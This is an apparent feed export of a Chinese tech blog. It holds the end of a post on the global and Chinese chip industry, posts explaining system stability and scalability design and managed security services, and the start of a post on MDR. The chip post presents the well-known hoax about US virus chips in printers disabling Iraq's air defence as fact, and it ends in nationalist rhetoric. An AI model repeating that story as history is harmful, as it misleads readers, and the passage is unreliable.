这些公司不仅是芯片的大规模采购者，同时也在自家产品中采用自家设计的芯片，以提高产品性能和降低成本。</li><li>新兴技术领域的公司：<br>NVIDIA： 在人工智能和图形处理领域，NVIDIA具有显著的地位，其GPU（图形处理器）在深度学习等领域取得了巨大成功。<br>AMD： 在处理器和图形芯片领域，AMD也在市场上展现出竞争力，尤其是在台式机和服务器市场。</li><li>其他：<br>日本的东芝、富士通，韩国的SK海力士等公司在存储器领域具有一定的市场份额。</li></ul><h2 id="中国芯片的发展"><a href="#中国芯片的发展" class="headerlink" title="中国芯片的发展"></a>中国芯片的发展</h2><p>通过海湾战争，中国看到，现代战争已经发展到信息化战争阶段，以芯片为基础的电子战和信息战对战争的进程起着决定性作用。美国军方早在1987年就开始耗巨资研制带有病毒的芯片。海湾战争中，伊拉克军队从法国购买的打印机中就被安装了这种病毒芯片。美军在空袭巴格达之前，将芯片上隐蔽的病毒遥控激活，结果病毒通过打印机侵入伊拉克军事指挥中心的主计算机系统，导致伊军指挥系统失灵，整个防空系统随即瘫痪，完全陷入了被动挨打的境地。如今在军舰、战车、飞机、导弹等现代化武器中，以芯片为核心的电子装备越来越多。过去几次战争的经验显示，如果电子设备失效，武器将变成一堆废铜烂铁。因此，谁拥有了先进的芯片，谁就能掌握战场的主动权。像芯片这种事关国防安全的关键技术，必须掌握在自己国家的手中。</p><p>中国芯片产业的发展可以追溯到20世纪70年代，那时中国的芯片技术还相对落后于世界先进水平。然而，经过几十年的努力和政策支持，中国已经取得了显著的进步，并在全球半导体市场中占据了重要的地位。</p><ul><li>早期发展阶段<br>1970年代初：中国政府开始认识到芯片产业的重要性，并着手建立国内的芯片研发和制造能力。<br>1980年代：随着改革开放的推进，中国开始引进国外的技术和资金，推动了芯片产业的发展。</li><li>进入国际市场（1990年代至今）<br>1990年代：中国逐渐成为全球电子产品的重要生产基地，对芯片的需求量大增。<br>2000年以后：中国政府加大了对芯片产业的支持力度，出台了一系列鼓励自主创新、吸引外资的政策。<br>2014年：“集成电路产业发展纲要”发布，提出“中国制造2025”的战略目标，旨在实现关键领域的自主可控。</li><li>现状与挑战<br>截至2023年，中国已经成为全球最大的芯片消费国，但其在高端芯片的设计和制造方面仍然依赖于外国公司，尤其是在最尖端的工艺节点上。<br>“卡脖子”问题依然存在，即在某些关键技术环节受到国际供应链限制，特别是在光刻机等核心设备以及EDA设计工具等领域。<br>虽然华为海思等企业已经在移动处理器等领域取得了一定突破，但在存储器和高性能计算芯片等方面仍面临挑战。</li><li>未来展望<br>随着中美贸易紧张局势持续，中国更加重视自主发展芯片产业，投入大量资源进行自主研发。<br>国内企业如长江存储、紫光展锐等正在积极开发自己的技术和产品，以减少对外部供应商的依赖。<br>在国家政策的引导下，预计中国的芯片产业将继续保持较快的增长速度，同时也会在技术创新、人才培养和国际合作等方面做出更多的努力。</li></ul><p>尽管面临着诸多挑战，中国芯片产业的发展前景总体来说是乐观的。不过，要想真正达到国际领先水平，还需要克服一系列技术和市场的障碍，并且需要时间来培养相关的生态系统。</p><p>半导体芯片制造这一极其复杂、高风险的业务一直是全球巨头之间的较量，也逐渐演变成为大国之间的竞争。虽然美国不断地在芯片领域打压我们，但是截止目前，美国并没有取得他们想要的结果，而中国的芯片领域在重重压力之下依旧坚持着发展，并且取得了不小的成绩。随着华为Mate60新手机发布后，我们已全面吹响了破除美帝科技霸权的号角，以芯片为代表的高科技之战，是我们崛起之前最后，也必须要打一场硬仗，只有打赢了对美国的芯片战争，才能真正建立完善的工业产业体系，走出一条属于中国的科技强国之路。</p><hr><p>作者博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;随着社会的进步和技术的发展，以互联网产业化、人工智能等为代表的第四次工业革命席转全球，人工智能技术如火如荼，将整个世界推入了智能化时代。有人说石油是现在工业的血液，那么芯片就是现代工业的大脑。芯片作为现代工业的大脑，它们被广泛应用于各种电子设备、通信、计算机、人工智能等领域
      
    
    </summary>
    
    
      <category term="读书" scheme="https://xiejava.gitee.io/categories/%E8%AF%BB%E4%B9%A6/"/>
    
    
      <category term="读后感" scheme="https://xiejava.gitee.io/tags/%E8%AF%BB%E5%90%8E%E6%84%9F/"/>
    
  </entry>
  
  <entry>
    <title>系统频繁崩溃，如何考虑系统的稳定性和可扩展性？</title>
    <link href="https://xiejava.gitee.io/posts/135a865f/"/>
    <id>https://xiejava.gitee.io/posts/135a865f/</id>
    <published>2023-11-29T03:33:31.000Z</published>
    <updated>2023-11-29T06:36:11.464Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231129/%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%B9%B3%E5%8F%B0%E7%A8%B3%E5%AE%9A%E6%80%A7.png" alt="在这里插入图片描述"></p><p>最近网传互联网应用信息系统频繁崩溃，语雀崩完淘宝崩，淘宝崩完滴滴崩，随着业务的发展和技术的进步，对于信息系统的要求也越来越高。信息应用系统为了满足不断增长的用户和业务需求，提高系统的稳定性和扩展性至关重要。</p><p>因为互联网应用面对的是广大的互联网用户，用户和业务需求变化非常快，所以系统既要考虑稳定性又要考虑可扩展性。</p><p>系统稳定性是指系统在面临外部干扰或内部变化时，能够保持其原有状态和功能，避免出现崩溃、失控或不可预测的行为。系统扩展性是指系统在面对增长的业务需求时，能够轻松地扩展其性能、容量和功能的能力。它是一种确保系统能够适应未来发展和变化的重要属性。良好的扩展性可以为企业节省大量的时间和资源，避免在业务增长过程中出现瓶颈。</p><p>系统的稳定性通常包括以下方面：</p><ol><li>容错性：系统在面临错误或异常情况时，能够自动检测并处理错误，避免故障扩散到整个系统。</li><li>可用性：系统在任何情况下都能够提供必要的功能和服务，避免出现单点故障或瓶颈。</li><li>可扩展性：系统能够根据业务需求的变化进行扩展和优化，以适应不断增长的用户数量和业务需求。</li><li>可维护性：系统在运行过程中能够被有效地监控、管理和维护，以确保系统的稳定性和可靠性。</li><li>安全性：系统能够抵御外部攻击和威胁，保护系统的数据和功能不受损害。</li></ol><h2 id="系统稳定性和可扩展性设计参考原则"><a href="#系统稳定性和可扩展性设计参考原则" class="headerlink" title="系统稳定性和可扩展性设计参考原则"></a>系统稳定性和可扩展性设计参考原则</h2><p>标准化和规范化：采用统一的开发标准和规范，确保系统的可维护性和可重用性。这可以减少系统复杂度，提高系统的可扩展性。</p><ul><li>分布式架构：采用分布式架构，将系统划分为多个独立的子系统，每个子系统都可以独立地处理特定的业务需求。这种架构可以提高系统的可扩展性和容错性。</li><li>单一职责原则：每个服务应该只关注自己的功能领域，避免出现跨职责的耦合。这样可以降低系统的复杂性，提高系统的稳定性。</li><li>高内聚、低耦合：每个服务应该高度内聚，同时尽量减少与其他服务的耦合。这样可以减少服务之间的依赖和互相影响，提高系统的稳定性。</li><li>服务自治：每个服务应该具有自我管理和决策能力，以减少对其他服务的依赖。这可以提高系统的可维护性和可扩展性。</li><li>负载均衡：在多个服务实例之间实现负载均衡，可以避免单个服务过载导致整个系统的瘫痪。通过负载均衡器将请求分配到不同的服务实例上，确保系统的稳定性。</li><li>容错性设计：在系统设计中，应该考虑异常情况和错误处理。例如，当某个服务出现故障时，应该能够通过其他服务的备份或冗余设计来保证系统的整体稳定性。</li><li>限流与熔断：在可能出现流量突增的场景中，可以通过限流和熔断机制来防止系统过载。限流可以限制请求的数量，避免系统超负荷运行；熔断则可以在某个服务出现故障时，快速地中断与其他服务的交互，避免故障扩散到整个系统。</li><li>自动化监控与恢复：通过自动化监控工具实时收集和分析系统的运行数据，可以及时发现潜在的问题。同时，自动化恢复工具可以在出现问题时，快速地恢复系统的正常运行。</li><li>版本控制与灰度发布：通过版本控制和灰度发布机制，可以逐步升级和优化每个服务，而不会对整个系统造成过大的影响。这有助于保持系统的稳定性。</li><li>数据一致性：在分布式系统中，数据一致性是一个重要的挑战。通过使用合适的数据复制、校验和验证机制，可以确保数据在多个服务之间的一致性，从而提高系统的稳定性。</li></ul><p>以上这些原则是相辅相成的，需要在系统设计和开发过程中综合考虑并实施。同时，随着业务需求和技术环境的变化，也需要不断优化和改进这些原则，以适应新的挑战和需求。</p><h2 id="如何提高系统的稳定性和可扩展性"><a href="#如何提高系统的稳定性和可扩展性" class="headerlink" title="如何提高系统的稳定性和可扩展性"></a>如何提高系统的稳定性和可扩展性</h2><p>提高系统的稳定性和可扩展性需要从多个方面入手，包括架构设计、技术选型、限流与熔断、数据一致性、负载均衡、自动化监控与恢复、版本控制与灰度发布以及容错性设计等。同时，也需要重视系统的可维护性和安全性，以确保系统能够长期稳定地运行并持续提供服务。<br>以下是一些常见的措施：</p><ul><li>架构设计：在设计系统时，应该考虑系统的整体架构和各个组件的交互方式。采用分布式架构和微服务设计可以提高系统的可扩展性和稳定性。同时，合理划分职责和边界，减少服务之间的耦合也是非常重要的。</li><li>技术选型：选择合适的技术和工具可以提高系统的稳定性和可扩展性。例如，使用容器化技术（如Docker）可以快速部署和扩展服务实例。使用无状态设计和服务降级可以增强系统的容错性。使用消息队列和异步通信可以减少系统之间的依赖和阻塞。</li><li>限流与熔断：在系统设计中，应该考虑限流和熔断机制，以防止流量突增或异常请求对系统造成过载。限流可以限制请求的数量，避免系统超负荷运行；熔断则可以在某个服务出现故障时，快速地中断与其他服务的交互，避免故障扩散到整个系统。</li><li>数据一致性：在分布式系统中，数据一致性是一个重要的挑战。通过使用合适的数据复制、校验和验证机制，可以确保数据在多个服务之间的一致性，从而提高系统的稳定性。使用分布式事务和一致性协议（如Raft或Paxos）可以解决数据一致性问题。</li><li>负载均衡：在多个服务实例之间实现负载均衡，可以避免单个服务过载导致整个系统的瘫痪。通过负载均衡器将请求分配到不同的服务实例上，确保系统的稳定性。使用动态负载均衡算法可以更好地分配负载，提高系统的性能和扩展性。</li><li>自动化监控与恢复：通过自动化监控工具实时收集和分析系统的运行数据，可以及时发现潜在的问题。同时，自动化恢复工具可以在出现问题时，快速地恢复系统的正常运行。自动化监控与恢复可以提高系统的稳定性和可维护性。</li><li>版本控制与灰度发布：通过版本控制和灰度发布机制，可以逐步升级和优化每个服务，而不会对整个系统造成过大的影响。这有助于保持系统的稳定性。使用版本控制工具可以方便地管理和跟踪版本的变更；使用灰度发布可以逐步部署新的版本，同时保证系统的可用性。</li><li>容错性设计：在系统设计中，应该考虑异常情况和错误处理。例如，当某个服务出现故障时，应该能够通过其他服务的备份或冗余设计来保证系统的整体稳定性。使用断路器、超时设置和重试机制等容错性设计可以增强系统的鲁棒性和可用性。</li><li>持续改进与优化：持续改进和优化是提高系统稳定性和可扩展性的关键。通过收集反馈、监控性能和不断改进技术栈可以提高系统的性能和可靠性。同时，不断优化数据流程、业务逻辑和算法也可以提高系统的可扩展性和响应速度。</li></ul><p>目前大部分大型的应用系统都会采用分布式微服务架构设计，微服务架构的系统稳定性可以通过以下几种方式来保障：</p><ul><li>单一职责原则：每个微服务都应该只关注自己的功能领域，并且只暴露必要的接口，以减少与其他微服务的耦合。这种设计原则可以帮助降低系统的复杂性，提高系统的稳定性。</li><li>容错性设计：在微服务架构中，每个微服务都应该具备一定的容错性，以处理异常情况。例如，当某个微服务出现故障时，应该能够通过其他微服务的备份或冗余设计来保证系统的整体稳定性。</li><li>负载均衡：通过在多个微服务之间实现负载均衡，可以避免某个微服务过载导致整个系统的瘫痪。负载均衡器可以分配请求到不同的微服务实例上，确保系统的稳定性。</li><li>限流与熔断：对于可能出现流量突增的场景，可以通过限流和熔断机制来防止系统过载。限流可以限制请求的数量，避免系统超负荷运行；熔断则可以在某个微服务出现故障时，快速地中断与其他微服务的交互，避免故障扩散到整个系统。</li><li>自动化监控与恢复：通过自动化监控工具实时收集和分析系统的运行数据，可以及时发现潜在的问题。同时，自动化恢复工具可以在出现问题时，快速地恢复系统的正常运行。</li><li>版本控制与灰度发布：通过版本控制和灰度发布机制，可以逐步升级和优化每个微服务，而不会对整个系统造成过大的影响。这有助于保持系统的稳定性。</li><li>数据一致性：在微服务架构中，由于数据是分散存储的，因此需要特别关注数据一致性问题。通过使用合适的数据复制、校验和验证机制，可以确保数据在多个微服务之间的一致性，从而提高系统的稳定性。</li></ul><p>随着云计算的发展，信息系统上云已经成为趋势，云平台的弹性扩展和自动化管理的特性，可以提高信息系统的基础平台的稳定性，实现快速扩展和容灾。</p><ul><li>弹性扩展：云平台能够根据业务需求提供弹性的计算资源，可以根据实际需求灵活地扩展或缩减计算资源，如计算能力、存储空间和网络带宽等。这种弹性扩展能力可以满足信息系统随着客户和业务的快速发展，不断调整需求，避免资源的浪费。</li><li>自动化管理：云平台通常提供自动化管理功能，可以帮助快速地部署、配置和管理计算资源。这些自动化工具可以降低管理成本，提高效率。</li><li>负载均衡：云平台可以提供负载均衡服务，将大量的用户请求分散到不同的服务器或节点上，以提高系统的吞吐量和响应速度。这种负载均衡技术可以确保系统在高负载情况下仍能保持较高的性能和可用性。</li><li>容灾备份：云平台通常提供容灾和备份机制，确保系统在遇到故障或灾难时能够快速恢复和正常运行。这些备份和恢复功能可以保护企业的数据和计算资源，避免因故障导致的数据丢失或损坏。</li><li>联合计算：云平台可以提供联合计算服务，将多个计算资源整合在一起，以提供更强大的计算能力。这种联合计算能力可以满足信息系统不断增长的计算需求，提高系统的性能和扩展性。</li><li>安全性：云平台通常采用严格的安全措施来保护企业的数据和计算资源。这些安全措施包括数据加密、访问控制、安全审计等，可以确保信息系统的数据和计算资源不被未经授权的访问或篡改。</li></ul><p>综上所述，信息系统可以通过优化技术采购采用分布式微服务架构，通过云平台的可扩展性实现弹性扩展、自动化管理、负载均衡、容灾备份、联合计算和安全性等方面。使得信息系统能够更好地满足不断变化的需求，提高系统的性能和扩展性。</p><hr><p>博客地址：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231129/%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%B9%B3%E5%8F%B0%E7%A8
      
    
    </summary>
    
    
      <category term="技术" scheme="https://xiejava.gitee.io/categories/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="架构" scheme="https://xiejava.gitee.io/categories/%E6%8A%80%E6%9C%AF/%E6%9E%B6%E6%9E%84/"/>
    
    
      <category term="架构" scheme="https://xiejava.gitee.io/tags/%E6%9E%B6%E6%9E%84/"/>
    
  </entry>
  
  <entry>
    <title>网络安全之了解安全托管服务（MSS）</title>
    <link href="https://xiejava.gitee.io/posts/756bb73f/"/>
    <id>https://xiejava.gitee.io/posts/756bb73f/</id>
    <published>2023-11-16T06:32:27.000Z</published>
    <updated>2023-11-16T06:35:07.886Z</updated>
    
    <content type="html"><![CDATA[<p>数字化已深入千行百业。数字化将给各行各业带来巨大的变化，现实世界和虚拟世界也将联系得更加紧密。随着云计算、大数据等新技术结合企业级业务的落地，数字时代的安全面临着前所未有的新挑战。近年来，网络安全问题日益严重，在企业数字化转型中，安全需求也变得越来越重要。对于企业来说，一方面是合规要求压力大，随着法规监管的日趋完善，企业需要遵守的合规要求也越来越多，这些法规对企业的网络安全和数据保护提出了更高的要求；另一方面企业面临的外部威胁加剧，随着网络攻击技术的不断发展，黑客、恶意软件等外部威胁也越来越严重。为了应对这些挑战确保企业顺利完成数字化转型并保障信息安全，企业除需要部署专业的安全产品之外，同样需要技术供应商提供专业有效的安全服务。</p><p>对绝大多数企事业单位来说，业务发展才是第一要务，对于安全来说，请专业的人做专业事，于是催生了安全托管运营服务。根据中商产业研究院发布的《2022-2027年中国网络安全行业发展趋势与投资格局研究报告》显示，2022年，中国托管安全服务市场规模约43亿元（6.4亿美元），同比增长16.8%，市场整体保持稳定快速发展。中商产业研究院分析师预测，2023年市场规模将达49.2亿元，2024年将达55.4亿元。</p><p>那么什么是安全托管服务，一般的安全托管服务都覆盖有哪些内容，什么样的企业适合安全托管服务，企业如何通过安全托管服务来构建自身的安全体系，带着这些问题我们一起来了解安全托管服务（MSS）</p><h2 id="一、什么是安全托管服务（MSS）"><a href="#一、什么是安全托管服务（MSS）" class="headerlink" title="一、什么是安全托管服务（MSS）"></a>一、什么是安全托管服务（MSS）</h2><p>安全托管服务（MSS）的产生背景可以追溯到20世纪90年代后期，当时随着互联网服务提供商（ISP）的出现，一些ISP开始为他们的用户提供防火墙设备，并管理防火墙。这是MSS的最初形态，即集成到ISP服务产品中的防火墙托管解决方案。</p><p>随着时间的推移，特别是进入21世纪后，网络威胁形势和企业安全需求的发展，使得MSS服务逐渐成为全方位服务的安全提供商。这种转变的动力不仅来自于企业内部日益增长的安全需求，也来自于外部环境的变化，包括国内外政治经济形势的发展、疫情影响的经济常态化、以及国内法规监管的日趋完善。</p><p>在这种情况下，计算技术与基础机构、IT建设和运维模式以及企业研发模式随之发生变革。仅通过网络安全产品和大量的人力堆叠难以应对云化场景下新的安全挑战。因此，企业需要一种新型的安全服务模式来满足这些需求。这就是安全托管服务（MSS）出现的背景。</p><p>安全托管服务（Managed Security Service，MSS），是由Gartner于2011年提出，简单来讲，即网络安全厂商通过自身的安全运营服务，包括人员、工具、平台等，为其用户提供7*24小时的安全托管服务。MSS安全托管服务最直接的目的，就是解决用户自身安全能力不足的问题，将专业的事情交给专业的人来做。说白了其实就是企业将自身的安全运营外包给有能力的安全厂商，解决自身安全运营能力不足的问题。</p><p>MSS服务的优势在于，它能够有效地提高企业的信息安全水平，降低安全风险，同时减少企业在信息安全方面的投入成本。通过将安全工作外包给专业的MSS服务提供商，企业可以更好地集中精力发展自身的核心业务，提高竞争力。</p><h2 id="二、安全托管服务的内容"><a href="#二、安全托管服务的内容" class="headerlink" title="二、安全托管服务的内容"></a>二、安全托管服务的内容</h2><p>安全托管服务（Managed Security Services，MSS）覆盖的内容非常广泛，可以满足企业在信息安全方面的各种需求。</p><p>以下是一些常见的安全托管服务内容：<br>1.安全监控和告警：提供24小时不间断的安全监控和告警服务，及时发现和处理安全事件，确保企业网络和系统的正常运行。<br>2.安全审计和评估：对企业网络和系统进行安全审计和评估，发现潜在的安全风险和漏洞，并提供相应的解决方案。<br>3.安全加固和优化：根据企业的实际需求，提供安全加固和优化建议，例如加强网络防御、优化安全策略等。<br>4.应急响应和处置：在发生安全事件时，提供应急响应和处置服务，例如进行事件分析、取证、溯源等，帮助企业快速恢复业务。<br>5.安全培训和意识提升：提供安全培训和意识提升服务，提高企业员工的安全意识和技能，增强企业的整体安全防范能力。<br>6.威胁情报和分析：通过收集和分析威胁情报，帮助企业了解最新的安全威胁和攻击趋势，为企业提供针对性的安全建议和防范措施。<br>7.云安全托管：提供云安全托管服务，包括云防火墙、云主机安全、云应用安全等，确保企业在云端的安全性和稳定性。<br>8.安全合规和风险管理：帮助企业遵守相关法律法规和标准要求，提供安全合规和风险管理服务。</p><p>安全托管服务覆盖了运营初期的安全评估服务，运营中期的安全加固、安全监控和漏洞感知及监控，运营后期的应急响应服务。安全托管服务可以根据企业的实际需求定制化服务内容，从基础的安全监控到高级的安全审计和应急响应等，全方位地满足企业在信息安全方面的需求。</p><p>以下是常见的安全托管服务及交付内容：</p><table><thead><tr><th>服务项</th><th>服务内容</th><th>交付内容</th></tr></thead><tbody><tr><td>安全评估服务</td><td>全面评估用户主机安全现状，发现用户主机、网络、应用及数据等方面存在的风险</td><td>每季度一次：提供《安全评估报告》</td></tr><tr><td>渗透测试服务</td><td>对核心业务系统安排工程师进行渗透测试工作，人工挖掘应用漏洞，针对发现的漏洞提出整改和修复方案</td><td>每季度一次：提供《渗透测试报告》</td></tr><tr><td>漏洞扫描服务</td><td>周期性漏洞扫描，人工分析扫描结果</td><td>每月一次：提供《漏洞扫描报告》</td></tr><tr><td>安全监控服务</td><td>持续监视用户主机安全产品告警事件，对安全事件进行分析、响应和运营优化</td><td>每周一次：提供《服务运营报告》</td></tr><tr><td>安全加固服务</td><td>针对评估、监测、检测等不同阶段发现的严重或高危级别安全事件，通知并协助用户开展处置响应</td><td>提供事件详细修复方案，协助开展安全风险加固</td></tr><tr><td>应急响应服务</td><td>在业务遭受黑客攻击出现异常时，提供及时的事件响应分析和专业处置，将突发事件损失降到最低，并协助开展溯源、损失评估、加固指导，提升安全防护水平。每季度提供一次应急响应服务，可按次增加订购</td><td>按季度提供《应急响应报告》</td></tr><tr><td>安全咨询服务</td><td>解答用户提出的各种安全问题，例如：安全问题诊断、排除，安全配置，安全管理等方面，并提供全方面的安全方案支持。</td><td>按需提供《安全咨询方案》</td></tr></tbody></table><h2 id="三、什么样的企业会选择安全托管服务"><a href="#三、什么样的企业会选择安全托管服务" class="headerlink" title="三、什么样的企业会选择安全托管服务"></a>三、什么样的企业会选择安全托管服务</h2><p>选择安全托管服务的企业通常包括以下几种情况：<br>1.规模较小、缺乏安全管理经验和能力的小微企业。这些企业可能没有足够的资金和人力资源来开展安全管理工作，或者缺乏专业的安全管理人员，无法有效地应对安全风险。通过选择安全托管服务，这些企业可以借助专业的安全服务机构的力量，提高自身的安全管理水平，降低安全风险。<br>2.从事高风险行业的企业。这些企业通常涉及到高度的信息安全、网络安全、物理安全等方面的风险，需要专业的安全服务机构提供全方位的安全托管服务。例如，一些互联网企业、金融企业、能源企业等。<br>3.曾经发生过安全事故的企业。这些企业可能已经经历过一些安全事故，或者存在一些安全隐患，需要专业的安全服务机构提供安全管理托管服务，帮助其加强安全管理，预防安全事故的发生。<br>4.需要进行安全管理改进的企业。这些企业可能已经有一定的安全管理基础，但是需要进行安全管理方面的改进，例如优化安全管理体系、提高安全管理效率等。通过选择安全托管服务，这些企业可以借助专业的安全服务机构的力量，进行安全管理方面的改进和提升。</p><p>选择安全托管服务的企业通常是在规模、行业、历史安全事故或需要改进安全管理等方面存在一定安全风险的企业。通过选择专业的安全托管服务提供商，这些企业可以获得更高效、更专业的安全服务支持，提高自身的安全管理水平，降低安全风险。</p><h2 id="四、企业如何通过安全托管服务构建安全体系"><a href="#四、企业如何通过安全托管服务构建安全体系" class="headerlink" title="四、企业如何通过安全托管服务构建安全体系"></a>四、企业如何通过安全托管服务构建安全体系</h2><p>安全托管服务（Managed Security Services，MSS）可以通过以下几个方面助力企业构建安全体系：<br>1.提供专业的安全团队和先进的技术手段：安全托管服务提供商通常具备专业的安全团队和先进的技术手段，能够提供高效、专业的安全服务，帮助企业快速发现和解决安全问题。<br>2.降低企业在信息安全方面的投入成本：通过将安全工作外包给专业的安全托管服务提供商，企业可以降低在信息安全方面的投入成本，包括人力、物力和财力等。<br>3.提高企业的信息安全水平：安全托管服务提供商可以提供全方位的安全托管服务，从基础的安全监控到高级的安全审计和应急响应等，帮助企业提高信息安全水平，降低安全风险。<br>4.满足企业不断增长的安全需求：随着企业业务的不断发展，企业面临的安全需求也在不断增长。安全托管服务提供商可以根据企业的实际情况和需求，提供定制化的安全服务方案，满足企业的个性化需求。<br>5.帮助企业建立完善的安全管理体系：安全托管服务提供商可以帮助企业建立完善的安全管理体系，包括安全策略、安全流程、安全培训等方面，提高企业的整体安全防范能力。<br>6.提供可跟踪管理的安全配置管理：安全托管服务提供商可以对托管系统的安全配置与管理全面负责，为客户提供可跟踪管理的安全配置管理，确保企业网络和系统的正常运行和安全性。<br>7.规范企业的安全管理流程：安全托管服务提供商可以帮助企业规范安全管理流程，例如进行定期的安全审计、安全培训、应急演练等，提高企业的安全管理效率和规范性。</p><p>总之，安全托管服务可以为企业提供全方位的安全托管服务，帮助企业构建完善的安全体系，提高信息安全水平，降低安全风险，同时减少投入成本。</p><hr><p>作者博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;数字化已深入千行百业。数字化将给各行各业带来巨大的变化，现实世界和虚拟世界也将联系得更加紧密。随着云计算、大数据等新技术结合企业级业务的落地，数字时代的安全面临着前所未有的新挑战。近年来，网络安全问题日益严重，在企业数字化转型中，安全需求也变得越来越重要。对于企业来说，一方
      
    
    </summary>
    
    
      <category term="技术" scheme="https://xiejava.gitee.io/categories/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="网络安全" scheme="https://xiejava.gitee.io/categories/%E6%8A%80%E6%9C%AF/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="网络安全" scheme="https://xiejava.gitee.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>网络安全之认识托管威胁检测与响应（MDR）</title>
    <link href="https://xiejava.gitee.io/posts/59886424/"/>
    <id>https://xiejava.gitee.io/posts/59886424/</id>
    <published>2023-11-12T09:22:27.000Z</published>
    <updated>2023-11-12T09:49:46.975Z</updated>
    
    <content type="html"><![CDATA[<p>随着数字化转型加速，企业的IT环境日益复杂，面临的网络安全威胁也在不断增加。传统的防御措施已经无法有效应对新型威胁，而且很多企业缺乏专业的网络安全团队和技术手段，导致大量的安全事件未能及时被发现和处理。</p><p>在这种背景下，托管威胁检测响应服务（MDR）应运而生。MDR能够利用现代安全运营中心的技术和专业人员，为客户提供全天候的安全监测和快速响应，从而缩短威胁发现和响应之间的窗口期，降低风险并减轻安全运营压力。</p><p>那么什么是MDR，MDR都包含了什么？MDR又与XDR是什么关系，与MSS又有什么区别？带着这些问题我们来了解托管威胁检测与响应（MDR）</p><h2 id="一、什么是MDR"><a href="#一、什么是MDR" class="headerlink" title="一、什么是MDR"></a>一、什么是MDR</h2><p>托管威胁检测与响应（Managed Detection and Response，托管检测与响应）是一种外包服务，旨在提供7x24小时的网络安全事件监测和分析，快速发现威胁并进行有效的响应。它结合了分析和人类专业知识来检测和消除网络中的威胁。大多数MDR服务通过主机层与网络层的威胁监测与分析技术，生成、收集安全事件以及上下文数据，结合安全运营平台的数据分析技术和安全运营专家的技术力量共同完成。</p><p>通俗一点讲，就是一些中小企业受制于在人员、时间、技能、资金、流程等方面的缺失，将企业自身的安全威胁检测与响应的活委托给安全服务商（Managed Security Service Provider, MSSP），通过外部托管安全服务提供商(MSSP)提供专业知识并填补安全架构空白，从而解决许多企业网络安全专家短缺技能不足的问题。从趋势上看，越来越多的企业转向选择MDR，由此获得最大化的投入产出效果。</p><p>倾向于采用MDR的企业的几种情形：</p><ul><li>没有安全运营团队，因此希望将安全监控运营外包给专门从事该领域的第三方；</li><li>安全运营团队人数有限，但通过MDR提供商，就能确保团队不必承担大多数一线工作负担以及众多其他安全运营工作任务，而是能够更加专注于服务输出；</li><li>有安全运营团队，可以自己进行全天候监控。尽管如此，他们仍希望将一线威胁检测工作转交给专门从事这项工作的公司。</li></ul><h2 id="二、MDR都包含了些什么"><a href="#二、MDR都包含了些什么" class="headerlink" title="二、MDR都包含了些什么"></a>二、MDR都包含了些什么</h2><p>Gartner将托管威胁检测与响应（MDR）其描述为通过7x24小时全天候不间断的监控和覆盖，建立起快速威胁检测与有效响应的服务。绝大多数MDR服务是通过主机层与网络层的技术生成、收集安全事件以及上下文数据，支持威胁检测与事件分析。</p><p>MDR服务一般包含以下内容：</p><ul><li>实时威胁检测：MDR服务提供实时监控和分析网络流量、系统日志以及其他安全事件的能力。</li><li>威胁狩猎：威胁狩猎力图在威胁访问关键数据之前发现威胁，通过使用先进的威胁情报和分析工具，识别潜在的安全威胁，包括已知的和未知的威胁。</li><li>威胁情报分析：情报是了解攻击者及其攻击方式的关键。安全团队通过威胁情报可以更好地了解特定的攻击者及其常用的战术、技术和流程 (TTP)，从而更有效地防御威胁；</li><li>事件响应：MDR服务不仅仅是关于检测威胁，还包括对安全事件的响应。一旦检测到潜在威胁，MDR团队会采取相应的措施，可能包括隔离受感染的系统、清除恶意代码，以及协助客户制定恢复计划。</li><li>全覆盖范围：MDR提供24/7/365持续服务，分析师可以在白天或晚上的任何时间做出响应；</li><li>专业知识：MDR不仅提供基于用户安全工具产生的日志的检测服务，还提供专业的安全人员对相关事件进行快速调查和响应；</li><li>实时可见性：MDR产品需要精细的实时端点可见性来捕捉和阻止攻击者。</li></ul><p>MDR充分利用客户侧已部署的终端、边界、流量等防护设备，通过行为分析、流量分析、威胁情报以及与多级专家的组合，为客户提供更加快速和全面的威胁监视、检测和响应服务。MDR服务具有现代安全运营中心远程交付的能力，专注于精准检测、调查分析、积极遏制事件，旨在通过持续运营以减少威胁发现和威胁响应之间的时间。</p><p>MDR服务不仅限于更强的检测和响应能力，它还可以为不堪重负的安全团队提供主动防御情报和高级威胁洞察。企业还可以使用MDR服务来应对合规挑战，因为它提供有关各种法规和标准的完整报告和日志保留。</p><h2 id="三、MDR与XDR的关系"><a href="#三、MDR与XDR的关系" class="headerlink" title="三、MDR与XDR的关系"></a>三、MDR与XDR的关系</h2><p>XDR全名是Extended Detection and 